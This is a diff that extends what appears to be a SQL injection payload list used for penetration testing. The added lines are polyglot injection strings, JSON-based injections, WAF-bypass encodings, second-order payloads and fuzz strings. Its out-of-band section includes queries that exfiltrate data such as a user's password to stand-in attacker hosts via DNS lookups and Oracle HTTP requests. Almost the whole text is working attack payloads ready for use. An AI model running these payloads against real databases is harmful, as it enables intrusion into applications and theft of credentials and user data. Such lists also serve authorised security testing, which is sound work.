@@ -926,6 +926,90 @@ WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM r) SELECT n FROM r LI
 ' AND 1=CONVERT(INT,(SELECT @@version))--
 
 # ============================================
+# ADVANCED POLYGLOT PAYLOADS
+# ============================================
+
+# Single query to rule them all
+SLEEP(5) /* ' or SLEEP(5) or " or SLEEP(5) or */
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10--
+" UNION SELECT 1,2,3,4,5,6,7,8,9,10--
+' OR 1=1 LIMIT 1 OFFSET 1--
+" OR 1=1 LIMIT 1 OFFSET 1--
+
+# Multi-database polyglots
+' OR 1=1 /*
+" OR 1=1 /*
+' OR '1'='1' --
+" OR "1"="1" --
+') OR ('1'='1' --
+") OR ("1"="1" --
+
+# ============================================
+# JSON / BSON SQLi PAYLOADS
+# ============================================
+
+# MySQL JSON
+' AND JSON_EXTRACT('{"a":1}', '$.a')=1--
+' AND JSON_DEPTH('{"a":1}')=2--
+
+# PostgreSQL JSON
+' AND '{"a":1}'::json->>'a' = '1'--
+' AND (SELECT count(*) FROM json_each('{"a":1, "b":2}'))=2--
+
+# ============================================
+# OUT-OF-BAND (OOB) ENHANCED
+# ============================================
+
+# DNS Exfiltration (Burp Collaborator style)
+'; exec master..xp_dirtree '//ATTACKER_ID.burpcollaborator.net/a'--
+' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.ATTACKER_DOMAIN\\a')))--
+' AND (SELECT 1 FROM (SELECT(PG_SLEEP(5)))a) AND 'a'='a'--
+
+# HTTP Exfiltration (Oracle)
+' AND 1=utl_http.request('http://attacker.com/'||(SELECT user FROM dual))--
+
+# ============================================
+# SECOND ORDER SQLi PAYLOADS
+# ============================================
+
+# Registering with a payload
+admin'--
+admin' #
+' or 1=1--
+
+# ============================================
+# WAF BYPASS - ADVANCED ENCODING
+# ============================================
+
+# Hex encoding
+0x27204f5220313d31
+' OR 1=0x31--
+
+# Unicode bypass
+' %u004f%u0052 1=1--
+' %u0027%u0020%u004f%u0052%u00201%u003d1
+
+# Double URL encoding
+%2527%2520OR%25201%253D1--
+
+# Null byte injection
+%00' OR 1=1--
+' OR 1=1%00
+
+# ============================================
+# AUTOMATED TOOLS COMPATIBILITY
+# ============================================
+
+# SQLMap-like test strings
+. . . '
+' '
+" "
+` `
+) )
+'' ''
+"" ""
+
+# ============================================
 # FINAL NOTES
 # ============================================
 
